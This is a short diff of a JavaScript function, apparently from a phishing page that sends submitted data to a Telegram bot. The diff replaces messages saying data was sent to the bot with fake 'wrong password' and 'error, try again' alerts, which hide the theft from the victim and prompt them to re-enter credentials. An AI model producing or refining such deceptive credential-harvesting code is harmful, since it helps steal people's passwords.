@@ -36,9 +36,9 @@ function sendData() {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            alert('Data berhasil dikirim ke bot Telegram');
+            alert('kata sandi salah');
         } else {
-            alert('Gagal mengirim data ke bot Telegram');
+            alert('kesalahan,coba lagi');
         }
     })
     .catch(error => {
